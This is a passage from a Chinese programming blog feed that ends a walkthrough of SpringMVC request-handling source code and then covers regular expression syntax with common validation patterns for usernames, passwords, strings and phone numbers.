<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> ModelAndView <span class="title">handle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> handleInternal(request, response, (HandlerMethod) handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>handleInternal方法，在RequestMappingHandlerAdapter中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> ModelAndView <span class="title">handleInternal</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="params"><span class="function">        HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getSessionAttributesHandler(handlerMethod).hasSessionAttributes()) &#123;</span><br><span class="line">        <span class="comment">// Always prevent caching in case of session attribute management.</span></span><br><span class="line">        checkAndPrepare(request, response, <span class="keyword">this</span>.cacheSecondsForSessionAttributeHandlers, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Uses configured default cacheSeconds setting.</span></span><br><span class="line">        checkAndPrepare(request, response, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Execute invokeHandlerMethod in synchronized block if required.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.synchronizeOnSession) &#123;</span><br><span class="line">        HttpSession session = request.getSession(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (session != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object mutex = WebUtils.getSessionMutex(session);</span><br><span class="line">            <span class="keyword">synchronized</span> (mutex) &#123;</span><br><span class="line">                <span class="keyword">return</span> invokeHandleMethod(request, response, handlerMethod);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//执行方法，封装ModelAndView</span></span><br><span class="line">    <span class="keyword">return</span> invokeHandleMethod(request, response, handlerMethod);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="组装默认视图名称"><a href="#组装默认视图名称" class="headerlink" title="组装默认视图名称"></a>组装默认视图名称</h3><p>前缀和后缀名都加上</p>
<h3 id="执行拦截器的postHandle方法"><a href="#执行拦截器的postHandle方法" class="headerlink" title="执行拦截器的postHandle方法"></a>执行拦截器的postHandle方法</h3><p>遍历intercepter的postHandle方法。</p>
<h3 id="处理最后的结果，渲染之类的"><a href="#处理最后的结果，渲染之类的" class="headerlink" title="处理最后的结果，渲染之类的"></a>处理最后的结果，渲染之类的</h3><p>processDispatchResult方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processDispatchResult</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="params"><span class="function">        HandlerExecutionChain mappedHandler, ModelAndView mv, Exception exception)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> errorView = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exception != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (exception <span class="keyword">instanceof</span> ModelAndViewDefiningException) &#123;</span><br><span class="line">            mv = ((ModelAndViewDefiningException) exception).getModelAndView();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Object handler = (mappedHandler != <span class="keyword">null</span> ? mappedHandler.getHandler() : <span class="keyword">null</span>);</span><br><span class="line">            mv = processHandlerException(request, response, handler, exception);</span><br><span class="line">            errorView = (mv != <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the handler return a view to render?</span></span><br><span class="line">    <span class="keyword">if</span> (mv != <span class="keyword">null</span> &amp;&amp; !mv.wasCleared()) &#123;</span><br><span class="line">    	<span class="comment">//渲染</span></span><br><span class="line">        render(mv, request, response);</span><br><span class="line">        <span class="keyword">if</span> (errorView) &#123;</span><br><span class="line">            WebUtils.clearErrorRequestAttributes(request);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) &#123;</span><br><span class="line">        <span class="comment">// Concurrent handling started during a forward</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mappedHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">        mappedHandler.triggerAfterCompletion(request, response, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重点看下render方法，进行渲染：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">render</span><span class="params">(ModelAndView mv, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//设置本地化</span></span><br><span class="line">    Locale locale = <span class="keyword">this</span>.localeResolver.resolveLocale(request);</span><br><span class="line">    response.setLocale(locale);</span><br><span class="line"></span><br><span class="line">    View view;</span><br><span class="line">    <span class="keyword">if</span> (mv.isReference()) &#123;</span><br><span class="line">        <span class="comment">//解析视图名，得到视图</span></span><br><span class="line">        view = resolveViewName(mv.getViewName(), mv.getModelInternal(), locale, request);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// No need to lookup: the ModelAndView object contains the actual View object.</span></span><br><span class="line">        view = mv.getView();</span><br><span class="line">        <span class="keyword">if</span> (view == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">&quot;ModelAndView [&quot;</span> + mv + <span class="string">&quot;] neither contains a view name nor a &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;View object in servlet with name &#x27;&quot;</span> + getServletName() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//委托给视图进行渲染</span></span><br><span class="line">    view.render(mv.getModelInternal(), request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>view.render就是进行视图的渲染，然后跳转页面等处理。</p>
<p>到这里大概的流程就走完了。其中涉及到的东西还有很多，暂先不做详细处理。</p>
<p>原文：<a href="http://cxis.me/2017/04/06/SpringMVC%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%8F%8A%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/">SpringMVC执行流程及源码解析</a></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>springmvc</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式详解</title>
    <url>//regular-expression</url>
    <content><![CDATA[<h2 id="本文目标"><a href="#本文目标" class="headerlink" title="本文目标"></a>本文目标</h2><blockquote>
<p>本文旨在更加简洁清晰的展现正则表达式， <code>第一部分</code> 是对正则表达式语法的简洁介绍， <code>第二部分</code> 则是常用正则表达式的示例。</p>
</blockquote>
<span id="more"></span>
<h2 id="简介及语法"><a href="#简介及语法" class="headerlink" title="简介及语法"></a>简介及语法</h2><h3 id="正则表达式是什么"><a href="#正则表达式是什么" class="headerlink" title="正则表达式是什么"></a>正则表达式是什么</h3><blockquote>
<p>在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要。正则表达式就是用于描述这些规则的工具。换句话说，正则表达式就是记录文本规则的代码。</p>
</blockquote>
<blockquote>
<p>正则表达式语言由两种基本字符类型组成：原义（正常）<code>文本字符</code>和<code>元字符</code>。元字符使正则表达式具有处理能力。</p>
</blockquote>
<h3 id="常用元字符"><a href="#常用元字符" class="headerlink" title="常用元字符"></a>常用元字符</h3><table>
<thead>
<tr>
<th align="left">元字符</th>
<th align="left">做什么用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>.</code></td>
<td align="left">匹配除换行符以外的任意字符</td>
</tr>
<tr>
<td align="left"><code>\w</code></td>
<td align="left">匹配字母或数字或下划线或汉字</td>
</tr>
<tr>
<td align="left"><code>\s</code></td>
<td align="left">匹配任意的空白符，包括空格，制表符（Tab），换行符，中文全角空格等）</td>
</tr>
<tr>
<td align="left"><code>\d</code></td>
<td align="left">匹配数字</td>
</tr>
<tr>
<td align="left"><code>\b</code></td>
<td align="left">匹配单词的开始或结束</td>
</tr>
<tr>
<td align="left"><code>^</code></td>
<td align="left">匹配字符串的开始</td>
</tr>
<tr>
<td align="left"><code>$</code></td>
<td align="left">匹配字符串的结束</td>
</tr>
</tbody></table>
<h3 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h3><blockquote>
<p>如果你想查找元字符本身的话，比如你查找 <code>.</code> ,或者 <code>*</code> ,就出现了问题：你没办法指定它们，因为它们会被解释成别的意思。这时你就得使用 <code>\</code> 来取消这些字符的特殊意义。因此，你应该使用 <code>\.</code> 和 <code>\*</code> 。当然，要查找 <code>\</code> 本身，你也得用 <code>\\</code> .<br>例如： <code>deerchao\.net</code> 匹配 <strong>deerchao.net</strong>，<code>C:\\Windows</code> 匹配 <strong>C:\Windows</strong> 。</p>
</blockquote>
<h3 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h3><blockquote>
<p>你已经看过了前面的 <code>*</code> , <code>+</code> , <code>&#123;2&#125;</code> , <code>&#123;5,12&#125;</code> 这几个匹配重复的方式了。下面是正则表达式中所有的限定符(指定数量的代码，例如*,{5,12}等)</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">元字符</th>
<th align="left">做什么用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>*</code></td>
<td align="left">重复零次或更多次</td>
</tr>
<tr>
<td align="left"><code>+</code></td>
<td align="left">重复一次或更多次</td>
</tr>
<tr>
<td align="left"><code>?</code></td>
<td align="left">重复零次或一次</td>
</tr>
<tr>
<td align="left"><code>&#123;n&#125;</code></td>
<td align="left">重复n次</td>
</tr>
<tr>
<td align="left"><code>&#123;n,&#125;</code></td>
<td align="left">重复n次或更多次</td>
</tr>
<tr>
<td align="left"><code>&#123;n,m&#125;</code></td>
<td align="left">重复n到m次</td>
</tr>
</tbody></table>
<blockquote>
<p>下面是一些重复的示例：<br><code>Windows\d+</code> 匹配Windows后面跟1个或更多数字<br><code>^\w+</code> 匹配一行的第一个单词(或整个字符串的第一个单词，具体匹配哪个意思得看选项设置)</p>
</blockquote>
<h3 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h3><blockquote>
<p>要想查找数字，字母或数字，空白是很简单的，因为已经有了对应这些字符集合的元字符，但是如果你想匹配没有预定义元字符的字符集合(比如元音字母a,e,i,o,u),应该怎么办？<br>很简单，你只需要在方括号里列出它们就行了，像 <code>[aeiou]</code> 就匹配任何一个英文元音字母， <code>[.?!]</code> 匹配标点符号(.或?或!)。<br>我们也可以轻松地指定一个字符范围，像 <code>[0-9]</code> 代表的含意与 <code>\d</code> 就是完全一致的：一位数字；同理[a-z0-9A-Z_]也完全等同于 <code>\w</code> （如果只考虑英文的话）。<br>下面是一个更复杂的表达式： <code>\(?0\d&#123;2&#125;[) -]?\d&#123;8&#125;</code> 。<br>这个表达式可以匹配几种格式的电话号码，像(010)88886666，或022-22334455，或02912345678等。我们对它进行一些分析吧：首先是一个转义字符(,它能出现0次或1次(?),然后是一个0，后面跟着2个数字(\d{2})，然后是)或-或空格中的一个，它出现1次或不出现(?)，最后是8个数字(\d{8})。</p>
</blockquote>
<h3 id="分支条件"><a href="#分支条件" class="headerlink" title="分支条件"></a>分支条件</h3><blockquote>
<p>正则表达式里的分枝条件指的是有几种规则，如果满足其中任意一种规则都应该当成匹配，具体方法是用|把不同的规则分隔开。<br>示例： <code>0\d&#123;2&#125;-\d&#123;8&#125;|0\d&#123;3&#125;-\d&#123;7&#125;</code><br>这个表达式匹配3位区号的电话号码，其中区号可以用小括号括起来，也可以不用，区号与本地号间可以用连字号或空格间隔，也可以没有间隔。你可以试试用分枝条件把这个表达式扩展成也支持4位区号的。<br>示例： <code>\d&#123;5&#125;-\d&#123;4&#125;|\d&#123;5&#125;</code><br>这个表达式用于匹配美国的邮政编码。美国邮编的规则是5位数字，或者用连字号间隔的9位数字。之所以要给出这个示例是因为它能说明一个问题：<strong>使用分枝条件时，要注意各个条件的顺序</strong>。如果你把它改成 <code>\d&#123;5&#125;|\d&#123;5&#125;-\d&#123;4&#125;</code> 的话，那么就只会匹配5位的邮编(以及9位邮编的前5位)。原因是匹配分枝条件时，将会从左到右地测试每个条件，如果满足了某个分枝的话，就不会去再管其它的条件了。</p>
</blockquote>
<h3 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h3><blockquote>
<p>重复单个字符，直接在字符后面加上限定符就行了。但如果想要重复多个字符，我们可以用小括号来指定 <strong>子表达式</strong>(也叫作<strong>分组</strong>)。<br><code>(\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;</code> 是一个简单的IP地址匹配表达式。要理解这个表达式，请按下列顺序分析它： <code>\d&#123;1,3&#125;</code> 匹配1到3位的数字， <code>(\d&#123;1,3&#125;\.)&#123;3&#125;</code> 匹配三位数字加上一个英文句号(这个整体也就是这个分组)重复3次，最后再加上一个一到三位的数字 <code>(\d&#123;1,3&#125;)</code> 。<br>不幸的是，它也将匹配 <em>256.300.888.999</em> 这种不可能存在的IP地址。我们只能使用冗长的分组，选择，字符串来描述一个 <strong>正确的IP地址：</strong> <code>((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)</code></p>
</blockquote>
<h3 id="反义"><a href="#反义" class="headerlink" title="反义"></a>反义</h3><blockquote>
<p>有时需要查找不属于某个能简单定义的字符类的字符。比如想查找除了数字以外，其它任意字符都行的情况，这时需要用到反义：</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">元字符</th>
<th align="left">做什么用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>\W</code></td>
<td align="left">匹配任意不是字母，数字，下划线，汉字的字符</td>
</tr>
<tr>
<td align="left"><code>\S</code></td>
<td align="left">匹配任意不是空白符的字符</td>
</tr>
<tr>
<td align="left"><code>\D</code></td>
<td align="left">匹配任意非数字的字符</td>
</tr>
<tr>
<td align="left"><code>\B</code></td>
<td align="left">匹配不是单词开头或结束的位置</td>
</tr>
<tr>
<td align="left"><code>[^x]</code></td>
<td align="left">匹配除了x以外的任意字符</td>
</tr>
<tr>
<td align="left"><code>[^aeiou]</code></td>
<td align="left">匹配除了aeiou这几个字母以外的任意字符</td>
</tr>
</tbody></table>
<blockquote>
<p>示例： <code>\S+</code> 匹配不包含空白符的字符串。 <code>&lt;a[^&gt;]+&gt;</code> 匹配用尖括号括起来的以a开头的字符串。</p>
</blockquote>
<h3 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h3><blockquote>
<p>使用小括号指定一个子表达式后，<strong>匹配这个子表达式</strong> 的文本(也就是此分组捕获的内容)可以在表达式或其它程序中作进一步的处理。默认情况下，每个分组会自动拥有一个 <strong>组号</strong>，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，以此类推。<br> <strong>后向引用</strong> 用于重复搜索前面某个分组匹配的文本。<br>示例： <code>\b(\w+)\b\s+\1\b</code> 可以用来匹配重复的单词，像go go, 或者kitty kitty。这个表达式首先是一个单词，也就是单词开始处和结束处之间的多于一个的字母或数字 <code>\b(\w+)\b</code> ，这个单词会被捕获到编号为1的分组中，然后是1个或几个空白符<code>\s+</code>，最后是分组1中捕获的内容（也就是前面匹配的那个单词） <code>\1</code> 。<br>你也可以自己指定子表达式的 <strong>组名</strong>.要指定一个子表达式的组名，请使用这样的语法： <code>(?&lt;Word&gt;\w+)</code> (或者把尖括号换成 <code>&#39;</code> 也行： <code>(?&#39;Word&#39;\w+))</code>,这样就把<code>\w+</code>的组名指定为 <strong>Word</strong> 了。要反向引用这个分组捕获的内容，你可以使用 <code>\k&lt;Word&gt;</code> ,所以上一个示例也可以写成这样： <code>\b(?&lt;Word&gt;\w+)\b\s+\k&lt;Word&gt;\b</code> 。</p>
</blockquote>
<h3 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h3><blockquote>
<p>接下来的四个用于查找在某些内容(但并不包括这些内容)之前或之后的东西，也就是说它们像\b,^,$那样用于指定一个位置，这个位置应该满足一定的条件(即断言)，因此它们也被称为 <strong>零宽断言</strong>。<br><code>(?=exp)</code> 也叫 <strong>零宽度正预测先行断言</strong>，它断言自身出现的位置的后面能匹配表达式exp。比如<code>\b\w+(?=ing\b)</code>，匹配以ing结尾的单词的前面部分(除了ing以外的部分)，如查找 <em>I’m singing while you’re dancing.</em> 时，它会匹配 sing 和 danc 。<br><code>(?&lt;=exp)</code> 也叫 <strong>零宽度正回顾后发断言</strong> ，它断言自身出现的位置的前面能匹配表达式exp。比如 <code>(?&lt;=\bre)\w+\b</code> 会匹配以re开头的单词的后半部分(除了re以外的部分)，例如在查找 <em>reading a book</em> 时，它匹配ading。<br>假如你想要给一个很长的数字中每三位间加一个逗号(当然是从右边加起了)，你可以这样查找需要在前面和里面添加逗号的部分： <code>((?&lt;=\d)\d&#123;3&#125;)+\b</code> ，用它对1234567890进行查找时结果是234567890。<br>下面这个示例同时使用了这两种断言： <code>(?&lt;=\s)\d+(?=\s)</code> 匹配以空白符间隔的数字( <strong>再次强调，不包括这些空白符</strong> )。</p>
</blockquote>
<h3 id="负向零宽断言"><a href="#负向零宽断言" class="headerlink" title="负向零宽断言"></a>负向零宽断言</h3><blockquote>
<p>前面我们提到过怎么查找不是某个字符或不在某个字符类里的字符的方法(反义)。但是如果我们只是想要确保某个字符没有出现，但并不想去匹配它时怎么办？例如，如果我们想查找这样的单词–它里面出现了字母q,但是q后面跟的不是字母u,我们可以尝试这样：<br><code>\b\w*q[^u]\w*\b</code> 匹配 <em>包含后面不是字母u的字母q的单词</em> 。但是如果多做测试(或者你思维足够敏锐，直接就观察出来了)，你会发现，如果q出现在单词的结尾的话，像Iraq,Benq，这个表达式就会出错。这是因为[^u]总要匹配一个字符，所以如果q是单词的最后一个字符的话，后面的[^u]将会匹配q后面的单词分隔符(可能是空格，或者是句号或其它的什么)，后面的 <code>\w*\b</code> 将会匹配下一个单词，于是 <code>\b\w*q[^u]\w*\b</code> 就能匹配整个Iraq fighting。<strong>负向零宽断言</strong> 能解决这样的问题，因为它只匹配一个位置，并不消费任何字符。现在，我们可以这样来解决这个问题： <code>\b\w*q(?!u)\w*\b</code> 。<br><strong>零宽度负预测先行断言</strong>(?!exp)，断言此位置的后面不能匹配表达式exp。例如： <code>\d&#123;3&#125;(?!\d)</code> 匹配三位数字，而且这三位数字的后面不能是数字； <code>\b((?!abc)\w)+\b</code> 匹配不包含连续字符串abc的单词。<br>同理，我们可以用(?&lt;!exp),*<em>零宽度负回顾后发断言来断言** 此位置的前面不能匹配表达式exp：(?&lt;![a-z])\d{7}匹配前面不是小写字母的七位数字。<br>一个更复杂的示例：`(?&lt;=&lt;(\w+)&gt;).</em>(?=&lt;/\1&gt;)<code> 匹配不包含属性的简单HTML标签内里的内容。</code>(?&lt;=&lt;(\w+)&gt;)<code>指定了这样的 **前缀**：被尖括号括起来的单词(比如可能是&lt;b&gt;)，然后是.</code>*<code>(任意的字符串),最后是一个 **后缀**</code>(?=&lt;/\1&gt;)<code>。注意后缀里的 \/ ，它用到了前面提过的字符转义；\1则是一个反向引用，引用的正是捕获的第一组，前面的 </code>(\w+)` 匹配的内容，这样如果前缀实际上是<b>的话，后缀就是</b>了。整个表达式匹配的是<b>和</b>之间的内容(再次提醒，不包括前缀和后缀本身)。</p>
</blockquote>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><blockquote>
<p>小括号的另一种用途是通过语法(?#comment)来包含注释。例如：<code>2[0-4]\d(?#200-249)|25[0-5](?#250-255)|[01]?\d\d?(?#0-199)</code>。<br>要包含注释的话，最好是启用“忽略模式里的空白符”选项，这样在编写表达式时能任意的添加空格，Tab，换行，而实际使用时这些都将被忽略。启用这个选项后，在#后面到这一行结束的所有文本都将被当成注释忽略掉。例如，我们可以前面的一个表达式写成这样：<br>      <code>(?&lt;=</code>    # 断言要匹配的文本的前缀<br>      <code>&lt;(\w+)&gt;</code> # 查找尖括号括起来的字母或数字(即HTML/XML标签)<br>      <code>)</code>       # 前缀结束<br>      <code>.*</code>      # 匹配任意文本<br>      <code>(?=</code>     # 断言要匹配的文本的后缀<br>      <code>&lt;\/\1&gt;</code>  # 查找尖括号括起来的内容：前面是一个”/“，后面是先前捕获的标签<br>      <code>)</code>       # 后缀结束</p>
</blockquote>
<h3 id="贪婪与懒惰"><a href="#贪婪与懒惰" class="headerlink" title="贪婪与懒惰"></a>贪婪与懒惰</h3><blockquote>
<p>当正则表达式中包含能接受重复的限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配 <strong>尽可能多</strong> 的字符。以这个表达式为例： <code>a.*b</code> ，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索aabab的话，它会匹配整个字符串aabab。这被称为 <strong>贪婪匹配</strong>。<br>有时，我们更需要 <strong>懒惰匹配</strong>，也就是匹配尽可能少的字符。前面给出的限定符都可以被转化为懒惰匹配模式，只要在它后面加上一个问号 ? 。这样 <code>.*?</code> 就意味着匹配任意数量的重复，但是在能使整个匹配成功的前提下使用最少的重复。<br>示例： <code>a.*?b</code> 匹配最短的，以a开始，以b结束的字符串。如果把它应用于aabab的话，它会匹配aab（第一到第三个字符）和ab（第四到第五个字符）。</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">语法</th>
<th align="left">做什么用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>*?</code></td>
<td align="left">重复任意次，但尽可能少重复</td>
</tr>
<tr>
<td align="left"><code>+?</code></td>
<td align="left">重复1次或更多次，但尽可能少重复</td>
</tr>
<tr>
<td align="left"><code>??</code></td>
<td align="left">重复0次或1次，但尽可能少重复</td>
</tr>
<tr>
<td align="left"><code>&#123;n,m&#125;?</code></td>
<td align="left">重复n到m次，但尽可能少重复</td>
</tr>
<tr>
<td align="left"><code>&#123;n,&#125;?</code></td>
<td align="left">重复n次以上，但尽可能少重复</td>
</tr>
</tbody></table>
<h3 id="其他元字符"><a href="#其他元字符" class="headerlink" title="其他元字符"></a>其他元字符</h3><table>
<thead>
<tr>
<th align="left">元字符</th>
<th align="left">做什么用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>\a</code></td>
<td align="left">报警字符(打印它的效果是电脑嘀一声)</td>
</tr>
<tr>
<td align="left"><code>\b</code></td>
<td align="left">通常是单词分界位置，但如果在字符类里使用代表退格</td>
</tr>
<tr>
<td align="left"><code>\t</code></td>
<td align="left">制表符，Tab</td>
</tr>
<tr>
<td align="left"><code>\r</code></td>
<td align="left">回车</td>
</tr>
<tr>
<td align="left"><code>\v</code></td>
<td align="left">竖向制表符</td>
</tr>
<tr>
<td align="left"><code>\f</code></td>
<td align="left">换页符</td>
</tr>
<tr>
<td align="left"><code>\n</code></td>
<td align="left">换行符</td>
</tr>
<tr>
<td align="left"><code>\e</code></td>
<td align="left">Escape</td>
</tr>
<tr>
<td align="left"><code>\0nn</code></td>
<td align="left">ASCII代码中八进制代码为nn的字符</td>
</tr>
<tr>
<td align="left"><code>\xnn</code></td>
<td align="left">ASCII代码中十六进制代码为nn的字符</td>
</tr>
<tr>
<td align="left"><code>\unnnn</code></td>
<td align="left">Unicode代码中十六进制代码为nnnn的字符</td>
</tr>
<tr>
<td align="left"><code>\cN</code></td>
<td align="left">ASCII控制字符。比如\cC代表Ctrl+C</td>
</tr>
<tr>
<td align="left"><code>\A</code></td>
<td align="left">字符串开头(类似^，但不受处理多行选项的影响)</td>
</tr>
<tr>
<td align="left"><code>\Z</code></td>
<td align="left">字符串结尾或行尾(不受处理多行选项的影响)</td>
</tr>
<tr>
<td align="left"><code>\z</code></td>
<td align="left">字符串结尾(类似$，但不受处理多行选项的影响)</td>
</tr>
<tr>
<td align="left"><code>\G</code></td>
<td align="left">当前搜索的开头</td>
</tr>
<tr>
<td align="left"><code>\p&#123;name&#125;</code></td>
<td align="left">Unicode中命名为name的字符类，例如\p{IsGreek}</td>
</tr>
<tr>
<td align="left"><code>(?&gt;exp)</code></td>
<td align="left">贪婪子表达式</td>
</tr>
<tr>
<td align="left"><code>(?&lt;x&gt;-&lt;y&gt;exp)</code></td>
<td align="left">平衡组</td>
</tr>
<tr>
<td align="left"><code>(?im-nsx:exp)</code></td>
<td align="left">在子表达式exp中改变处理选项</td>
</tr>
<tr>
<td align="left"><code>(?im-nsx)</code></td>
<td align="left">为表达式后面的部分改变处理选项</td>
</tr>
<tr>
<td align="left"><a href="%60(?(exp)yes%7Cno)%60">1</a></td>
<td align="left">把exp当作零宽正向先行断言，如果在这个位置能匹配，使用yes作为此组的表达式；否则使用no</td>
</tr>
<tr>
<td align="left"><code>(?(exp)yes)</code></td>
<td align="left">同上，只是使用空表达式作为no</td>
</tr>
<tr>
<td align="left"><a href="%60(?(name)yes%7Cno)%60">2</a></td>
<td align="left">如果命名为name的组捕获到了内容，使用yes作为表达式；否则使用no</td>
</tr>
<tr>
<td align="left"><code>(?(name)yes)</code></td>
<td align="left">同上，只是使用空表达式作为no</td>
</tr>
</tbody></table>
<blockquote>
</blockquote>
<h2 id="正则表达式常用实例"><a href="#正则表达式常用实例" class="headerlink" title="正则表达式常用实例"></a>正则表达式常用实例</h2><h3 id="账号-密码"><a href="#账号-密码" class="headerlink" title="账号/密码"></a>账号/密码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">帐号是否合法(字母开头，允许<span class="number">5</span>-<span class="number">16</span>字节，允许字母数字下划线) = <span class="string">&quot;^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$&quot;</span></span><br><span class="line">密码(以字母开头，长度在<span class="number">6</span>~<span class="number">18</span>之间，只能包含字母、数字和下划线) = <span class="string">&quot;^[a-zA-Z]\w&#123;5,17&#125;$&quot;</span></span><br><span class="line">强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在<span class="number">8</span>-<span class="number">10</span>之间) = <span class="string">&quot;^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).&#123;8,10&#125;$&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="字符串校验"><a href="#字符串校验" class="headerlink" title="字符串校验"></a>字符串校验</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">汉字 = <span class="string">&quot;^[\u4e00-\u9fa5]&#123;0,&#125;$&quot;</span>;</span><br><span class="line">英文和数字 = <span class="string">&quot;^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]&#123;4,40&#125;$&quot;</span>;</span><br><span class="line">长度为<span class="number">3</span>-<span class="number">20</span>的所有字符 = <span class="string">&quot;^.&#123;3,20&#125;$&quot;</span>；</span><br><span class="line">由<span class="number">26</span>个英文字母组成的字符串 = <span class="string">&quot;^[A-Za-z]+$&quot;</span>；</span><br><span class="line">由<span class="number">26</span>个大写英文字母组成的字符串 = <span class="string">&quot;^[A-Z]+$&quot;</span>；</span><br><span class="line">由<span class="number">26</span>个小写英文字母组成的字符串 = <span class="string">&quot;^[a-z]+$&quot;</span>；</span><br><span class="line">由数字和<span class="number">26</span>个英文字母组成的字符串 = <span class="string">&quot;^[A-Za-z0-9]+$&quot;</span>；</span><br><span class="line">由数字、<span class="number">26</span>个英文字母或者下划线组成的字符串 = <span class="string">&quot;^\w+$ 或 ^\w&#123;3,20&#125;$&quot;</span>；</span><br><span class="line">中文、英文、数字包括下划线 = <span class="string">&quot;^[\u4E00-\u9FA5A-Za-z0-9_]+$&quot;</span>；</span><br><span class="line">中文、英文、数字但不包括下划线等符号 = <span class="string">&quot;^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]&#123;2,20&#125;$&quot;</span>；</span><br><span class="line">禁止输入含有~的字符 = <span class="string">&quot;[^~\x22]+&quot;</span>；</span><br></pre></td></tr></table></figure>
<h3 id="手机号"><a href="#手机号" class="headerlink" title="手机号"></a>手机号</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 手机号码</span></span><br><span class="line"><span class="comment"> * 移动：134,135,136,137,138,139,147,150,151,152,157,158,159,170,178,182,183,184,187,188</span></span><br><span class="line"><span class="comment"> * 联通：130,131,132,145,152,155,156,1709,171,176,185,186</span></span><br><span class="line"><span class="comment"> * 电信：133,134,153,1700,177,180,181,189</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">String MOBILE = <span class="string">&quot;^1(3[0-9]|4[57]|5[0-35-9]|7[01678]|8[0-9])\\d&#123;8&#125;$&quot;</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span 